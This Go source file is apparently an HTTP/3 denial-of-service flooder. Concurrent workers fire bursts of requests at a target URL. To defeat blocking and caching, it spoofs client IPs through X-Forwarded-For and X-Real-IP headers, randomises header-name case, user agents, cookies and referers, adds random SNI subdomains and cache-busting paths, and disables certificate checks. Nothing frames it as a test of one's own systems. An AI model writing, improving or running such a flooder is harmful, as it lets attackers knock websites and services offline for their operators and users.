package main

import (
    "context"
    "crypto/rand"
    "crypto/tls"
    "errors"
    "flag"
    "fmt"
    "io"
    mathrand "math/rand"
    "net"
    "net/http"
    "net/url"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    "github.com/quic-go/quic-go/http3"
)

const (
    MaxAdaptiveDelay int64 = 8000
)

var (
    RequestsSent         uint64
    ResponsesReceived    uint64
    CurrentDelay         int64
    TotalLatency         int64
    TotalErrors          uint64
    TLSErrors            uint64
    ConnectionErrors     uint64
    TimeoutErrors        uint64
    ClientCloseErrors    uint64
    DestroyErrors        uint64
    TransportErrors      uint64
    StreamErrors         uint64
    HandshakeErrors      uint64
    CanceledErrors       uint64
    UnknownErrors        uint64
    RecoveredConnections uint64
)

var (
    UserAgents = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (Android 14; Mobile; rv:126.0) Gecko/126.0 Firefox/126.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.2535.67",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/110.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/110.0.0.0",
        "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 SamsungBrowser/21.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }
    Languages = []string{
        "en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "de-DE,de;q=0.9",
        "ja-JP,ja;q=0.9", "ko-KR,ko;q=0.9", "zh-CN,zh;q=0.8", "ru-RU,ru;q=0.7", "pt-BR,pt;q=0.7",
        "it-IT,it;q=0.6", "nl-NL,nl;q=0.5",
    }
    Referers = []string{
        "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://www.yahoo.com/",
        "https://www.baidu.com/", "https://www.yandex.ru/", "https://t.co/", "https://www.facebook.com/",
        "https://www.instagram.com/", "https://www.reddit.com/",
    }
    Accepts         = []string{"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json, text/plain, */*"}
    AcceptEncodings = []string{"gzip, deflate, br", "gzip, deflate"}
    CustomHeaders   = []string{"X-Requested-With", "Cache-Control", "Pragma", "DNT", "X-Purpose", "Upgrade-Insecure-Requests"}
    CookieNames     = []string{"sessionid", "userid", "token", "visit", "pref"}
    PayloadFormats  = []string{"json", "form", "plain"}
)

func GetRandomElement(slice []string) string {
    return slice[mathrand.Intn(len(slice))]
}

func GetRandomIP() string {
    return fmt.Sprintf("%d.%d.%d.%d", mathrand.Intn(255)+1, mathrand.Intn(256), mathrand.Intn(256), mathrand.Intn(256))
}

func RandomHeaderName(s string) string {
    var out strings.Builder
    for _, c := range s {
        if mathrand.Intn(2) == 0 {
            out.WriteString(strings.ToUpper(string(c)))
        } else {
            out.WriteString(strings.ToLower(string(c)))
        }
    }
    return out.String()
}

func GenerateRandomCookies() string {
    var cookies []string
    count := mathrand.Intn(3) + 1
    for i := 0; i < count; i++ {
        cookies = append(cookies, fmt.Sprintf("%s=%x", GetRandomElement(CookieNames), mathrand.Intn(0xffffff)))
    }
    return strings.Join(cookies, "; ")
}

func GenerateRandomPayload(format string) (io.Reader, string) {
    switch format {
    case "json":
        body := fmt.Sprintf(`{"id":%d,"name":"user%d","random":"%x"}`, mathrand.Intn(1000), mathrand.Intn(1000), mathrand.Intn(0xffffff))
        return strings.NewReader(body), "application/json"
    case "form":
        body := fmt.Sprintf("id=%d&name=user%d&token=%x", mathrand.Intn(1000), mathrand.Intn(1000), mathrand.Intn(0xffffff))
        return strings.NewReader(body), "application/x-www-form-urlencoded"
    default:
        size := mathrand.Intn(1024*10) + 1024
        data := make([]byte, size)
        rand.Read(data)
        return strings.NewReader(string(data)), "text/plain"
    }
}

func RandomPath(base string) string {
    parsed, _ := url.Parse(base)
    parsed.Path += "/" + fmt.Sprintf("%x", mathrand.Intn(0xfffff))
    q := parsed.Query()
    q.Set("v", fmt.Sprintf("%d", mathrand.Intn(99999)))
    parsed.RawQuery = q.Encode()
    return parsed.String()
}

func BuildHTTP3Client(config *WorkerConfig) *http.Client {
    return &http.Client{
        Transport: &http3.Transport{
            TLSClientConfig: &tls.Config{
                InsecureSkipVerify: config.InsecureTLS,
                ServerName:         RandomSNI(config.TargetURL),
                MinVersion:         tls.VersionTLS12,
            },
        },
        Timeout: 30 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }
}

func RandomSNI(rawURL string) string {
    parsed, err := url.Parse(rawURL)
    if err != nil || !strings.Contains(parsed.Host, ".") {
        return ""
    }
    host := parsed.Hostname()
    if mathrand.Intn(3) == 0 {
        return fmt.Sprintf("%x.%s", mathrand.Intn(0xfffff), host)
    }
    return host
}

func IsTransientError(err error) bool {
    if err == nil {
        return false
    }
    errStr := err.Error()
    return strings.Contains(errStr, "timeout") || 
           strings.Contains(errStr, "connection reset") ||
           strings.Contains(errStr, "broken pipe") ||
           strings.Contains(errStr, "connection refused") ||
           strings.Contains(errStr, "no such host") ||
           strings.Contains(errStr, "network is unreachable")
}

func IsTLSError(err error) bool {
    if err == nil {
        return false
    }
    errStr := err.Error()
    return strings.Contains(errStr, "tls") ||
           strings.Contains(errStr, "handshake") ||
           strings.Contains(errStr, "certificate") ||
           strings.Contains(errStr, "ssl")
}

func IsClientCloseError(err error) bool {
    if err == nil {
        return false
    }
    errStr := err.Error()
    return strings.Contains(errStr, "use of closed") ||
           strings.Contains(errStr, "closed network") ||
           strings.Contains(errStr, "closed connection") ||
           strings.Contains(errStr, "transport is closing") ||
           strings.Contains(errStr, "http3: transport closed")
}

func IsDestroyError(err error) bool {
    if err == nil {
        return false
    }
    errStr := err.Error()
    return strings.Contains(errStr, "destroy") ||
           strings.Contains(errStr, "canceled") ||
           strings.Contains(errStr, "context canceled") ||
           strings.Contains(errStr, "deadline exceeded")
}

func ClassifyError(err error) string {
    if err == nil {
        return "none"
    }
    if IsTLSError(err) {
        return "tls_error"
    }
    if IsClientCloseError(err) {
        return "client_close_error"
    }
    if IsDestroyError(err) {
        return "destroy_error"
    }
    if errors.Is(err, context.Canceled) {
        return "canceled"
    }
    if errors.Is(err, context.DeadlineExceeded) {
        return "timeout"
    }
    if netErr, ok := err.(net.Error); ok {
        if netErr.Timeout() {
            return "network_timeout"
        }
        return "network_error"
    }
    if strings.Contains(err.Error(), "stream") {
        return "stream_error"
    }
    if strings.Contains(err.Error(), "transport") {
        return "transport_error"
    }
    return "unknown_error"
}

func IncrementErrorCounter(errType string) {
    atomic.AddUint64(&TotalErrors, 1)
    switch errType {
    case "tls_error":
        atomic.AddUint64(&TLSErrors, 1)
    case "client_close_error":
        atomic.AddUint64(&ClientCloseErrors, 1)
    case "destroy_error":
        atomic.AddUint64(&DestroyErrors, 1)
    case "canceled":
        atomic.AddUint64(&CanceledErrors, 1)
    case "timeout", "network_timeout":
        atomic.AddUint64(&TimeoutErrors, 1)
    case "network_error":
        atomic.AddUint64(&ConnectionErrors, 1)
    case "stream_error":
        atomic.AddUint64(&StreamErrors, 1)
    case "transport_error":
        atomic.AddUint64(&TransportErrors, 1)
    case "handshake_error":
        atomic.AddUint64(&HandshakeErrors, 1)
    default:
        atomic.AddUint64(&UnknownErrors, 1)
    }
}

type WorkerConfig struct {
    TargetURL     string
    Methods       []string
    IPRandom      bool
    PathRandom    bool
    Retry         bool
    Burst         bool
    BurstSize     int
    JitterMs      int
    InsecureTLS   bool
    AdaptiveDelay bool
    ThinkTimeMs   int
    Verbose       bool
}

func Worker(ctx context.Context, wg *sync.WaitGroup, config *WorkerConfig, workerID int) {
    defer wg.Done()

    var client *http.Client
    var clientMutex sync.Mutex
    burstsSinceLastCycle := 0
    const clientCycleThreshold = 25

    recreateClient := func() {
        clientMutex.Lock()
        defer clientMutex.Unlock()
        
        if client != nil {
            if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
                transport.CloseIdleConnections()
            }
        }
        client = BuildHTTP3Client(config)
        atomic.AddUint64(&RecoveredConnections, 1)
        if config.Verbose {
            fmt.Printf("[Worker %d] Client recreated due to errors\n", workerID)
        }
    }

    recreateClient()

    for {
        select {
        case <-ctx.Done():
            clientMutex.Lock()
            if client != nil {
                if transport, ok := client.Transport.(interface{ CloseIdleConnections() }); ok {
                    transport.CloseIdleConnections()
                }
            }
            clientMutex.Unlock()
            return
        default:
            if burstsSinceLastCycle > clientCycleThreshold {
                recreateClient()
                burstsSinceLastCycle = 0
            }

            burstCount := 1
            if config.Burst {
                burstCount = 1 + mathrand.Intn(config.BurstSize)
            }

            for i := 0; i < burstCount; i++ {
                select {
                case <-ctx.Done():
                    return
                default:
                    method := GetRandomElement(config.Methods)
                    reqURL := config.TargetURL
                    if config.PathRandom {
                        reqURL = RandomPath(config.TargetURL)
                    }

                    var payload io.Reader
                    contentType := ""
                    if method == "POST" || method == "PUT" || method == "PATCH" {
                        format := GetRandomElement(PayloadFormats)
                        payload, contentType = GenerateRandomPayload(format)
                    }

                    req, err := http.NewRequestWithContext(ctx, method, reqURL, payload)
                    if err != nil {
                        IncrementErrorCounter("request_creation")
                        continue
                    }

                    req.Header.Set(RandomHeaderName("User-Agent"), GetRandomElement(UserAgents))
                    req.Header.Set(RandomHeaderName("Accept-Language"), GetRandomElement(Languages))
                    req.Header.Set(RandomHeaderName("Referer"), GetRandomElement(Referers))
                    req.Header.Set(RandomHeaderName("Accept"), GetRandomElement(Accepts))
                    req.Header.Set(RandomHeaderName("Accept-Encoding"), GetRandomElement(AcceptEncodings))
                    req.Header.Set(RandomHeaderName("Connection"), "keep-alive")
                    req.Header.Set(RandomHeaderName("Cache-Control"), "no-cache")
                    req.Header.Set(RandomHeaderName("Cookie"), GenerateRandomCookies())
                    
                    if contentType != "" {
                        req.Header.Set(RandomHeaderName("Content-Type"), contentType)
                    }
                    if config.IPRandom {
                        ip := GetRandomIP()
                        req.Header.Set(RandomHeaderName("X-Forwarded-For"), ip)
                        req.Header.Set(RandomHeaderName("X-Real-IP"), ip)
                    }
                    for _, h := range CustomHeaders {
                        req.Header.Set(RandomHeaderName(h), GetRandomElement([]string{"1", "no-cache", "XMLHttpRequest"}))
                    }

                    atomic.AddUint64(&RequestsSent, 1)
                    start := time.Now()
                    
                    clientMutex.Lock()
                    currentClient := client
                    clientMutex.Unlock()
                    
                    resp, err := currentClient.Do(req)
                    latency := time.Since(start).Milliseconds()
                    atomic.AddInt64(&TotalLatency, latency)

                    if err != nil {
                        errType := ClassifyError(err)
                        IncrementErrorCounter(errType)
                        
                        if config.Verbose && mathrand.Intn(100) == 0 {
                            fmt.Printf("[Worker %d] Error: %s - %v\n", workerID, errType, err)
                        }
                        
                        if IsClientCloseError(err) || IsDestroyError(err) || IsTLSError(err) {
                            recreateClient()
                            burstsSinceLastCycle = 0
                        }
                        
                        if config.Retry && IsTransientError(err) && i < burstCount-1 {
                            time.Sleep(25 * time.Millisecond)
                            continue
                        }
                        
                        if config.AdaptiveDelay {
                            if IsTransientError(err) || IsTLSError(err) {
                                newDelay := atomic.AddInt64(&CurrentDelay, 150)
                                if newDelay > MaxAdaptiveDelay {
                                    atomic.StoreInt64(&CurrentDelay, MaxAdaptiveDelay)
                                }
                            }
                        }
                        continue
                    }

                    io.Copy(io.Discard, resp.Body)
                    resp.Body.Close()
                    atomic.AddUint64(&ResponsesReceived, 1)

                    if config.AdaptiveDelay && resp.StatusCode >= 400 {
                        newDelay := atomic.AddInt64(&CurrentDelay, 100)
                        if newDelay > MaxAdaptiveDelay {
                            atomic.StoreInt64(&CurrentDelay, MaxAdaptiveDelay)
                        }
                    }

                    if i < burstCount-1 {
                        select {
                        case <-ctx.Done():
                            return
                        case <-time.After(time.Duration(25+mathrand.Intn(100)) * time.Millisecond):
                        }
                    }
                }
            }

            burstsSinceLastCycle++

            baseDelay := int64(0)
            if config.AdaptiveDelay {
                baseDelay = atomic.LoadInt64(&CurrentDelay)
                if baseDelay > 0 {
                    newDelay := int64(float64(baseDelay) * 0.95)
                    atomic.StoreInt64(&CurrentDelay, newDelay)
                }
            }
            
            thinkTime := mathrand.Int63n(int64(config.ThinkTimeMs))
            jitter := mathrand.Int63n(int64(config.JitterMs))
            totalDelay := baseDelay + thinkTime + jitter
            
            select {
            case <-ctx.Done():
                return
            case <-time.After(time.Duration(totalDelay) * time.Millisecond):
            }
        }
    }
}

func printStats(startTime time.Time, config *WorkerConfig) {
    elapsed := time.Since(startTime)
    sent := atomic.LoadUint64(&RequestsSent)
    recv := atomic.LoadUint64(&ResponsesReceived)
    totalErrors := atomic.LoadUint64(&TotalErrors)
    
    fmt.Printf("Duration: %v\n", elapsed.Round(time.Second))
    fmt.Printf("Requests Sent: %d\n", sent)
    fmt.Printf("Responses Received: %d\n", recv)
    fmt.Printf("Success Rate: %.2f%%\n", float64(recv)/float64(sent)*100)
    
    if recv > 0 {
        fmt.Printf("Average Latency: %.0fms\n", float64(atomic.LoadInt64(&TotalLatency))/float64(recv))
    }
    
    fmt.Printf("Total Errors: %d\n", totalErrors)
    fmt.Printf("TLS Errors: %d\n", atomic.LoadUint64(&TLSErrors))
    fmt.Printf("Connection Errors: %d\n", atomic.LoadUint64(&ConnectionErrors))
    fmt.Printf("Timeout Errors: %d\n", atomic.LoadUint64(&TimeoutErrors))
    fmt.Printf("Client Close Errors: %d\n", atomic.LoadUint64(&ClientCloseErrors))
    fmt.Printf("Destroy Errors: %d\n", atomic.LoadUint64(&DestroyErrors))
    fmt.Printf("Transport Errors: %d\n", atomic.LoadUint64(&TransportErrors))
    fmt.Printf("Stream Errors: %d\n", atomic.LoadUint64(&StreamErrors))
    fmt.Printf("Handshake Errors: %d\n", atomic.LoadUint64(&HandshakeErrors))
    fmt.Printf("Canceled Errors: %d\n", atomic.LoadUint64(&CanceledErrors))
    fmt.Printf("Unknown Errors: %d\n", atomic.LoadUint64(&UnknownErrors))
    fmt.Printf("Recovered Connections: %d\n", atomic.LoadUint64(&RecoveredConnections))
}

func main() {
    UrlPtr := flag.String("url", "", "Target URL")
    PortPtr := flag.String("port", "", "Target port")
    DurationPtr := flag.Int("duration", 5, "Duration in seconds")  // Changed from minutes to seconds
    MethodsPtr := flag.String("http-method", "GET", "HTTP methods")
    ConcurrencyPtr := flag.Int("concurrency", 100, "Concurrent workers")
    PathRandomPtr := flag.Bool("random-path", false, "Random paths")
    JitterPtr := flag.Int("jitter", 50, "Jitter in ms")
    BurstSizePtr := flag.Int("burst-size", 15, "Burst size")
    AdaptiveDelayPtr := flag.Bool("adaptive-delay", false, "Adaptive delay")
    ThinkTimePtr := flag.Int("think-time", 7000, "Think time in ms")
    BurstPtr := flag.Bool("burst", true, "Burst mode")
    VerbosePtr := flag.Bool("verbose", false, "Verbose output")

    flag.Parse()

    if *UrlPtr == "" {
        fmt.Println("Error: --url required")
        return
    }

    finalURL := *UrlPtr
    if !strings.HasPrefix(finalURL, "http") {
        finalURL = "https://" + finalURL
    }

    if *PortPtr != "" {
        parsed, _ := url.Parse(finalURL)
        host, _, _ := net.SplitHostPort(parsed.Host)
        if host == "" {
            host = parsed.Host
        }
        parsed.Host = net.JoinHostPort(host, *PortPtr)
        finalURL = parsed.String()
    }

    methods := strings.Split(*MethodsPtr, ",")
    duration := time.Duration(*DurationPtr) * time.Second  // Changed from Millisecond to Second
    ctx, cancel := context.WithTimeout(context.Background(), duration)
    defer cancel()

    fmt.Printf("Target: %s\n", finalURL)
    fmt.Printf("Workers: %d\n", *ConcurrencyPtr)
    fmt.Printf("Duration: %v seconds\n", duration.Seconds())
    fmt.Println("Starting...")
    fmt.Println()

    config := &WorkerConfig{
        TargetURL:     finalURL,
        Methods:       methods,
        IPRandom:      true,
        PathRandom:    *PathRandomPtr,
        Retry:         true,
        Burst:         *BurstPtr,
        BurstSize:     *BurstSizePtr,
        JitterMs:      *JitterPtr,
        InsecureTLS:   true,
        AdaptiveDelay: *AdaptiveDelayPtr,
        ThinkTimeMs:   *ThinkTimePtr,
        Verbose:       *VerbosePtr,
    }

    var wg sync.WaitGroup
    startTime := time.Now()

    go func() {
        ticker := time.NewTicker(5 * time.Second)
        defer ticker.Stop()
        for {
            select {
            case <-ctx.Done():
                return
            case <-ticker.C:
                elapsed := time.Since(startTime)
                sent := atomic.LoadUint64(&RequestsSent)
                recv := atomic.LoadUint64(&ResponsesReceived)
                errors := atomic.LoadUint64(&TotalErrors)
                rps := float64(sent) / elapsed.Seconds()
                
                fmt.Printf("\rProgress: %v | Sent: %d | Recv: %d | Errors: %d | RPS: %.1f", 
                    elapsed.Round(time.Second), sent, recv, errors, rps)
            }
        }
    }()

    for i := 0; i < *ConcurrencyPtr; i++ {
        wg.Add(1)
        go Worker(ctx, &wg, config, i)
    }

    wg.Wait()
    printStats(startTime, config)
}